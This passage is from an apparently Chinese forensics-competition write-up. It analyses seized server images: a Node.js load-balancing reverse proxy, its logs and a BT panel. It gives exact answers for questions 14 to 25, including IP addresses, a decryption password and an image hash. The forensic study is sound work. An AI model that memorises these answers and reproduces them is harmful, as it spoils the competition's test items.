class="line">     * 运行环境</span><br><span class="line">     * 0 =&gt; dev:开发 1 =&gt; test:测试 2 =&gt; prod:生产</span><br><span class="line">     */</span><br><span class="line">    run_env : 0,</span><br><span class="line">    sql_log : false,</span><br><span class="line">    autorun_config : &#123;</span><br><span class="line">        /* 文件系统系统 */</span><br><span class="line">        ADFileServer        : true,</span><br><span class="line">        /* 反向代理系统 */</span><br><span class="line">        ADProxy             : true,</span><br><span class="line">        /* 消息推送系统 */</span><br><span class="line">        ADWSDeliver         : false,</span><br><span class="line">        ADTCPDeliver        : false,</span><br><span class="line">        ADUDPDeliver        : false,</span><br><span class="line">    &#125;,</span><br><span class="line">    servants : new Set(),</span><br><span class="line">    /* 数据库基本配置 */</span><br><span class="line">    database : &#123;</span><br><span class="line">        open : false,</span><br><span class="line">        config : &#123;</span><br><span class="line">            host : &#x27;&#x27;,</span><br><span class="line">            user : &#x27;&#x27;,</span><br><span class="line">            pass : &#x27;&#x27;,</span><br><span class="line">            database : &#x27;&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    /*</span><br><span class="line">     * Redis相关</span><br><span class="line">     */</span><br><span class="line">    redis : &#123;</span><br><span class="line">        open : false,</span><br><span class="line">        config : &#123;</span><br><span class="line">            host : &#x27;127.0.0.1&#x27;,</span><br><span class="line">            port : &#x27;6379&#x27;,</span><br><span class="line">            password : &#x27;&#x27;,</span><br><span class="line">            db : &#x27;0&#x27;,</span><br><span class="line">            channel : &#x27;Phanes&#x27;,</span><br><span class="line">            retry_strategy : function () &#123;</span><br><span class="line">                return 5000;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    /* 服务器基本配置 */</span><br><span class="line">    server_config : &#123;</span><br><span class="line">        host : &#x27;0.0.0.0&#x27;,</span><br><span class="line">        port : 80,</span><br><span class="line">        safe_port : 8443,</span><br><span class="line">        static_path : &#x27;static&#x27;,</span><br><span class="line">        static_host : &#x27;127.0.0.1&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">    /* Websocket配置 */</span><br><span class="line">    ws_params : &#123;</span><br><span class="line">        /* 心跳时间 */</span><br><span class="line">        ws_heart_interval : 120000</span><br><span class="line">    &#125;,</span><br><span class="line">    /* UDP配置 */</span><br><span class="line">    udp_params : &#123;</span><br><span class="line">        udp_host : &#x27;127.0.0.1&#x27;,</span><br><span class="line">        udp_port : 50000,</span><br><span class="line">    &#125;,</span><br><span class="line">    /* 系统指令间隔 */</span><br><span class="line">    System_timer_interval : 60000,</span><br><span class="line">    /* 抓取间隔 */</span><br><span class="line">    Catch_timer_interval : 90000,</span><br><span class="line">    /* 解析间隔 */</span><br><span class="line">    Looper_timer_interval : 3000,</span><br><span class="line">    /* 码流解析间隔 */</span><br><span class="line">    Stream_timer_interval : 120,</span><br><span class="line">    /*</span><br><span class="line">     * 上传路径</span><br><span class="line">     */</span><br><span class="line">    upload_path : &#x27;./uploads/&#x27;,</span><br><span class="line">    /* HTTPS OPTIONS */</span><br><span class="line">    https : &#123;</span><br><span class="line">        open : false,</span><br><span class="line">        config : &#123;</span><br><span class="line">            pfx : undefined,</span><br><span class="line">            passphrase : &#x27;&#x27;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    /* 服务器标识 */</span><br><span class="line">    X_Powered_By : &#x27;Chronus Express&#x27;,</span><br><span class="line">    /* 服务器是否支持跨域 */</span><br><span class="line">    ACAO : false,</span><br><span class="line">    /* 错误代码 */</span><br><span class="line">    error_code : &#123;</span><br><span class="line">        100 : &#x27;Success&#x27;,</span><br><span class="line">        101 : &#x27;System Running&#x27;,</span><br><span class="line">        102 : &#x27;Error Return&#x27;,</span><br><span class="line">        104 : &#x27;System ShutDown&#x27;,</span><br><span class="line"></span><br><span class="line">        200 : &#x27;Failed&#x27;,</span><br><span class="line">        201 : &#x27;System Error&#x27;,</span><br><span class="line">        202 : &#x27;JSON Phrase Error&#x27;,</span><br><span class="line">        203 : &#x27;Command Error&#x27;,</span><br><span class="line">        204 : &#x27;Interface is Banned&#x27;,</span><br><span class="line">        205 : &#x27;Async Final Error&#x27;,</span><br><span class="line">        206 : &#x27;File Path Error&#x27;,</span><br><span class="line">        207 : &#x27;Buffer Error&#x27;,</span><br><span class="line">        208 : &#x27;Error Format of Request Body&#x27;,</span><br><span class="line">        209 : &#x27;Interface Request Timeout&#x27;,</span><br><span class="line">        210 : &#x27;Data Empty&#x27;,</span><br><span class="line">        211 : &#x27;Auth Token Error&#x27;,</span><br><span class="line">        212 : &#x27;Message Encrypt/Decrypt Error&#x27;,</span><br><span class="line">        213 : &#x27;UDP Error&#x27;,</span><br><span class="line">        214 : &#x27;TCP Error&#x27;,</span><br><span class="line"></span><br><span class="line">        300 : &#x27;Database Not Connected&#x27;,</span><br><span class="line">        301 : &#x27;Query Error&#x27;,</span><br><span class="line">        302 : &#x27;TransAction Error&#x27;,</span><br><span class="line">        303 : &#x27;RollBack Error&#x27;,</span><br><span class="line"></span><br><span class="line">        400 : &#x27;Redis Not Open&#x27;,</span><br><span class="line">        401 : &#x27;Redis Not Connected&#x27;,</span><br><span class="line">        403 : &#x27;Redis Error&#x27;,</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>再查看一下，发现19行到第34行有设置关键配置，故得出结论是<code>负载均衡</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">[ccj@localhost chronusNode]$ cat controller/ADProxy.js</span><br><span class="line">/**</span><br><span class="line"> * 反向代理</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">module.exports = function(_brain, _app) &#123;</span><br><span class="line">    /* INCLUDE */</span><br><span class="line">    const path = _brain.A.path;</span><br><span class="line">    const async = _brain.A.async;</span><br><span class="line">    const proxy = require(&#x27;http-proxy-middleware&#x27;);</span><br><span class="line">    const net = require(&#x27;net&#x27;);</span><br><span class="line">    /* DEFINE */</span><br><span class="line">    const _tag = path.basename(__filename, &quot;.js&quot;);</span><br><span class="line">    var _isBanned = false;</span><br><span class="line">    var _isStarted = false;</span><br><span class="line">    if(!_brain.A.checkIsNull(_brain.C.autorun_config[_tag], _tag))&#123;</span><br><span class="line">        _isStarted = _brain.C.autorun_config[_tag];</span><br><span class="line">    &#125;</span><br><span class="line">    /* DEFINE PROXY */</span><br><span class="line">    const _proxy50 = &#123;</span><br><span class="line">        protocol: &#x27;http:&#x27;,</span><br><span class="line">        host: &#x27;192.168.110.111&#x27;,</span><br><span class="line">        port: 80</span><br><span class="line">    &#125;</span><br><span class="line">    const _proxy100 = &#123;</span><br><span class="line">        protocol: &#x27;http:&#x27;,</span><br><span class="line">        host: &#x27;192.168.110.112&#x27;,</span><br><span class="line">        port: 80</span><br><span class="line">    &#125;</span><br><span class="line">    const _proxy100p = &#123;</span><br><span class="line">        protocol: &#x27;http:&#x27;,</span><br><span class="line">        host: &#x27;192.168.110.113&#x27;,</span><br><span class="line">        port: 80</span><br><span class="line">    &#125;</span><br><span class="line">    /* Private Function */</span><br><span class="line">    /**</span><br><span class="line">     * Service Running</span><br><span class="line">     */</span><br><span class="line">    var service = function ()&#123;</span><br><span class="line">        if(!_isStarted) return;</span><br><span class="line">        // proxy middleware options</span><br><span class="line">        const _proxyer_chronus = proxy(&#123;</span><br><span class="line">            target: &#x27;/&#x27;, // target host</span><br><span class="line">            changeOrigin: true,               // needed for virtual hosted sites</span><br><span class="line">            ws: true,                          // proxy websockets</span><br><span class="line">            router: function(req) &#123;</span><br><span class="line">                var clientIP = req.get(&quot;x-forwarded-for&quot;)</span><br><span class="line">                if (clientIP == undefined) &#123;</span><br><span class="line">                    clientIP = req.connection.remoteAddress</span><br><span class="line">                &#125;</span><br><span class="line">                var clientIPArr = clientIP.split(&quot;.&quot;)</span><br><span class="line">                if (clientIPArr.length == 4) &#123;</span><br><span class="line">                    var clientIP3Int = parseInt(clientIPArr[2])</span><br><span class="line">                    global.logger.warn(&#x27;[Proxy_RequestHeader] -&gt; &#x27; + JSON.stringify(req.headers));</span><br><span class="line">                    global.logger.warn(&#x27;[Proxy_ClientIP] -&gt; &#x27; + clientIP);</span><br><span class="line">                    if (clientIP3Int &lt;= 50) &#123;</span><br><span class="line">                        global.logger.warn(&#x27;[Proxy_Destination] -&gt; &#x27; + JSON.stringify(_proxy50));</span><br><span class="line">                        return _proxy50</span><br><span class="line">                    &#125; else if (clientIP3Int &lt;= 100) &#123;</span><br><span class="line">                        global.logger.warn(&#x27;[Proxy_Destination] -&gt; &#x27; + JSON.stringify(_proxy100));</span><br><span class="line">                        return _proxy100</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        global.logger.warn(&#x27;[Proxy_Destination] -&gt; &#x27; + JSON.stringify(_proxy100p));</span><br><span class="line">                        return _proxy100p</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        _app.all(&#x27;/*&#x27;, _proxyer_chronus);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Service Killing</span><br><span class="line">     */</span><br><span class="line">    var serviceKiller = function ()&#123;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /* Public Function */</span><br><span class="line">    /* 返回_tag */</span><br><span class="line">    var getTag = function ()&#123;</span><br><span class="line">        return _tag;</span><br><span class="line">    &#125;;</span><br><span class="line">    /* 判断服务是否开启 */</span><br><span class="line">    var isStarted = function ()&#123;</span><br><span class="line">        return _isStarted;</span><br><span class="line">    &#125;;</span><br><span class="line">    /* 判断服务是否被意外禁止 */</span><br><span class="line">    var isBanned = function ()&#123;</span><br><span class="line">        return _isBanned;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    /* 服务开关 */</span><br><span class="line">    var startServer = function (callBack)&#123;</span><br><span class="line">        _isStarted = true;</span><br><span class="line">        service();</span><br><span class="line">        if(callBack)</span><br><span class="line">            callBack(100, _tag + &#x27; Started&#x27;);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    var stopServer = function (callBack)&#123;</span><br><span class="line">        _isStarted = false;</span><br><span class="line">        serviceKiller();</span><br><span class="line">        if(callBack)</span><br><span class="line">            callBack(100, _tag + &#x27; Stopped&#x27;);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    /* Service AutoRun */</span><br><span class="line">    if(_isStarted)&#123;</span><br><span class="line">        startServer();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        stopServer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return&#123;</span><br><span class="line">        getTag             : getTag,</span><br><span class="line">        isStarted          : isStarted,</span><br><span class="line">        isBanned           : isBanned,</span><br><span class="line">        startServer        : startServer,</span><br><span class="line">        stopServer         : stopServer,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="题目15"><a class="markdownIt-Anchor" href="#题目15"></a> 题目15</h3>
<ul>
<li>上一题中，提到的主要功能对应的服务监听的端口为：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">const _proxy50 = &#123;</span><br><span class="line">        protocol: &#x27;http:&#x27;,</span><br><span class="line">        host: &#x27;192.168.110.111&#x27;,</span><br><span class="line">        port: 80</span><br><span class="line">    &#125;</span><br><span class="line">    const _proxy100 = &#123;</span><br><span class="line">        protocol: &#x27;http:&#x27;,</span><br><span class="line">        host: &#x27;192.168.110.112&#x27;,</span><br><span class="line">        port: 80</span><br><span class="line">    &#125;</span><br><span class="line">    const _proxy100p = &#123;</span><br><span class="line">        protocol: &#x27;http:&#x27;,</span><br><span class="line">        host: &#x27;192.168.110.113&#x27;,</span><br><span class="line">        port: 80</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>主要还是注意看到上题的配置文件，主要功能是负载均衡，这个反向代理的配置最主要看，得到端口<code>80</code></li>
</ul>
<h3 id="题目16"><a class="markdownIt-Anchor" href="#题目16"></a> 题目16*</h3>
<ul>
<li>上一题中，提到的服务所使用的启动命令为：</li>
<li>这题复现不出来，这题我挂载该镜像的时候<code>history</code>已经被处理过了，原来没有处理的，会出现2百多行的history，而我挂载的虚拟机上只有几十行，还是我登录上去自己输入的命令，这题直接贴上答案<code>node app.js</code></li>
</ul>
<h3 id="题目17"><a class="markdownIt-Anchor" href="#题目17"></a> 题目17</h3>
<ul>
<li>
<p>经分析，该服务对于请求来源IP的处理依据是：根据请求源IP地址的第（）位进行判断【标准格式：9】</p>
</li>
<li>
<p>这题还是要看代码，代码看懂了一切都好说，还是代码问题</p>
</li>
<li>
<p>这段代码就是接收用户的ip<code>var clientIP = req.get(&quot;x-forwarded-for&quot;)</code>，然后利用<code>.</code>将ip分成4段，之后判断ip段数是否为4，提取ip的第3段，答案<code>3</code></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (clientIPArr.length == 4) &#123;</span><br><span class="line">                    var clientIP3Int = parseInt(clientIPArr[2])</span><br></pre></td></tr></table></figure>
<ul>
<li>对第3段做处理</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">router: function(req) &#123;</span><br><span class="line">                var clientIP = req.get(&quot;x-forwarded-for&quot;)</span><br><span class="line">                if (clientIP == undefined) &#123;</span><br><span class="line">                    clientIP = req.connection.remoteAddress</span><br><span class="line">                &#125;</span><br><span class="line">                var clientIPArr = clientIP.split(&quot;.&quot;)</span><br><span class="line">                if (clientIPArr.length == 4) &#123;</span><br><span class="line">                    var clientIP3Int = parseInt(clientIPArr[2])</span><br><span class="line">                    global.logger.warn(&#x27;[Proxy_RequestHeader] -&gt; &#x27; + JSON.stringify(req.headers));</span><br><span class="line">                    global.logger.warn(&#x27;[Proxy_ClientIP] -&gt; &#x27; + clientIP);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="题目18"><a class="markdownIt-Anchor" href="#题目18"></a> 题目18</h3>
<ul>
<li>
<p>经分析，当判断条件小于50时，服务器会将该请求转发到IP为（）的服务器上【标准格式：111.111.111.111】</p>
</li>
<li>
<p>依然是查看第15题的那个反向代理的配置,可以看到<code>const _proxy50</code>对应的就是<code>192.168.110.111</code>，答案即为所求</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">const _proxy50 = &#123;</span><br><span class="line">        protocol: &#x27;http:&#x27;,</span><br><span class="line">        host: &#x27;192.168.110.111&#x27;,</span><br><span class="line">        port: 80</span><br><span class="line">    &#125;</span><br><span class="line">    const _proxy100 = &#123;</span><br><span class="line">        protocol: &#x27;http:&#x27;,</span><br><span class="line">        host: &#x27;192.168.110.112&#x27;,</span><br><span class="line">        port: 80</span><br><span class="line">    &#125;</span><br><span class="line">    const _proxy100p = &#123;</span><br><span class="line">        protocol: &#x27;http:&#x27;,</span><br><span class="line">        host: &#x27;192.168.110.113&#x27;,</span><br><span class="line">        port: 80</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>正确的应该是看这个代码，这边有50、100和其他</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var clientIPArr = clientIP.split(&quot;.&quot;)</span><br><span class="line">               if (clientIPArr.length == 4) &#123;</span><br><span class="line">                   var clientIP3Int = parseInt(clientIPArr[2])</span><br><span class="line">                   global.logger.warn(&#x27;[Proxy_RequestHeader] -&gt; &#x27; + JSON.stringify(req.headers));</span><br><span class="line">                   global.logger.warn(&#x27;[Proxy_ClientIP] -&gt; &#x27; + clientIP);</span><br><span class="line">                   if (clientIP3Int &lt;= 50) &#123;</span><br><span class="line">                       global.logger.warn(&#x27;[Proxy_Destination] -&gt; &#x27; + JSON.stringify(_proxy50));</span><br><span class="line">                       return _proxy50</span><br><span class="line">                   &#125; else if (clientIP3Int &lt;= 100) &#123;</span><br><span class="line">                       global.logger.warn(&#x27;[Proxy_Destination] -&gt; &#x27; + JSON.stringify(_proxy100));</span><br><span class="line">                       return _proxy100</span><br><span class="line">                   &#125; else &#123;</span><br><span class="line">                       global.logger.warn(&#x27;[Proxy_Destination] -&gt; &#x27; + JSON.stringify(_proxy100p));</span><br><span class="line">                       return _proxy100p</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="题目19"><a class="markdownIt-Anchor" href="#题目19"></a> 题目19</h3>
<ul>
<li>
<p>请分析，该服务器转发的目标服务器一共有几台【标准格式：9】</p>
</li>
<li>
<p>通过第18题不就看到三个ip，也就是转发3台服务器，答案<code>3</code></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">const _proxy50 = &#123;</span><br><span class="line">        protocol: &#x27;http:&#x27;,</span><br><span class="line">        host: &#x27;192.168.110.111&#x27;,</span><br><span class="line">        port: 80</span><br><span class="line">    &#125;</span><br><span class="line">    const _proxy100 = &#123;</span><br><span class="line">        protocol: &#x27;http:&#x27;,</span><br><span class="line">        host: &#x27;192.168.110.112&#x27;,</span><br><span class="line">        port: 80</span><br><span class="line">    &#125;</span><br><span class="line">    const _proxy100p = &#123;</span><br><span class="line">        protocol: &#x27;http:&#x27;,</span><br><span class="line">        host: &#x27;192.168.110.113&#x27;,</span><br><span class="line">        port: 80</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="题目20"><a class="markdownIt-Anchor" href="#题目20"></a> 题目20</h3>
<ul>
<li>
<p>请分析，受害者通讯录被获取时，其设备的IP地址为【标准格式：111.111.111.111】</p>
</li>
<li>
<p>在<code>/opt/honglianjingsai/chronusNode/logs</code>这个目录下找到日志，需要找的是<code>2021年4月24日</code>的日志，由前面可以推断得知<code>4.24</code>是案发时间所以，可以得到答案：<code>192.168.110.252</code></p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020201454276.png" alt="image-20241020201454276"></p>
<h3 id="题目21"><a class="markdownIt-Anchor" href="#题目21"></a> 题目21</h3>
<ul>
<li>
<p>请分析，受害者的通讯录被窃取之后，经由该服务器转发到了IP为（）的服务器上【标准格 式：111.111.111.111】</p>
</li>
<li>
<p>依然是分析第20题的日志，得到转发到的服务器ip，<code>192.168.110.113</code></p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020201556845.png" alt="image-20241020201556845"></p>
<h2 id="检材3"><a class="markdownIt-Anchor" href="#检材3"></a> 检材3</h2>
<ul>
<li>检材3给的是<code>txt</code>后缀的文件，其实没有<code>txt</code>后缀</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020202121370.png" alt="image-20241020202121370"></p>
<ul>
<li>用的还是检材1的加密工具，使用<code>Veracrypt</code>解密就行，密码为<code>192.168.110.113-CAB2021</code>，解密和检测1的方法一样，解密挂载后会出现3个附件</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020202341767.png" alt="image-20241020202341767"></p>
<ul>
<li>复制一份出来，然后再关闭<code>Veracrypt</code></li>
<li>看到复制的文件都是<code>E01</code>格式，继续挂载</li>
</ul>
<h3 id="题目22"><a class="markdownIt-Anchor" href="#题目22"></a> 题目22</h3>
<ul>
<li>
<p>检材三的原始硬盘的SHA256值为：</p>
</li>
<li>
<p>这题给了3个文件，但是显然只要算一个文件的sha256，但是由于不知道是哪个文件，我就三个文件的sha256都算了，当然比赛的时候肯定是先跳过，或者边算边做下面的题目</p>
</li>
<li>
<p>结果算出来是web3的sha256：<code>205C1120874CE0E24ABFB3BB1525ACF330E05111E4AD1D323F3DEE59265306BF</code></p>
</li>
<li>
<p>说明<code>web3</code>的这个镜像才是关键的，其他镜像也可以做下面的题目，但是web3有一些日志</p>
</li>
<li>
<p>这里先挂载<code>web3</code>的镜像，然后使用远程终端进行连接方便操作</p>
</li>
</ul>
<h3 id="题目23"><a class="markdownIt-Anchor" href="#题目23"></a> 题目23*</h3>
<ul>
<li>
<p>先挂载个镜像，用虚拟机启动，</p>
</li>
<li>
<p>请分析第21题中，所指的服务器的开机密码为：</p>
</li>
</ul>
<h3 id="题目24"><a class="markdownIt-Anchor" href="#题目24"></a> 题目24</h3>
<ul>
<li>嫌疑人架设网站使用了宝塔面板，请问面板的登陆用户名为：</li>
<li>使用<code>history</code>命令，发现有宝塔命令，直接使用宝塔命令查看</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021090329647.png" alt="image-20241021090329647"></p>
<ul>
<li>使用<code>bt</code>命令，直接选择编号<code>14</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021090405041.png" alt="image-20241021090405041"></p>
<ul>
<li>查看到用户名<code>hl123</code>，所以最后的答案就是：<code>hl123</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021090456474.png" alt="image-20241021090456474"></p>
<ul>
<li>同时发现内网宝塔面板的地址，这里试一下宝塔的账号和密码，发现密码不对，直接该密码</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021090642102.png" alt="image-20241021090642102"></p>
<ul>
<li>输入编号<code>5</code>进行重置密码</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021090727218.png" alt="image-20241021090727218"></p>
<ul>
<li>这样就成功登录</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021090804744.png" alt="image-20241021090804744"></p>
<h3 id="题目25"><a class="markdownIt-Anchor" href="#题目25"></a> 题目25</h3>
<ul>
<li>请分析用于重置宝塔面板密码的函数名为</li>
<li>本题要稍微熟悉一点宝塔以及宝塔的一些文件结构</li>
<li>这些都根目录（不是家目录）中的<code>www/server/panel/tools.py</code>这个py文件中</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021091229007.png" alt="image-20241021091229007"></p>
<ul>
<li>之前看到简介为5的，直接查找数字5，结果找到如下</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021091959902.png" alt="image-20241021091959902"></p>
<ul>
<li>所以最后答案<code>set_panel_pwd</code>,记事本中有点bug<code>_</code>显示不出来</li>
</ul>
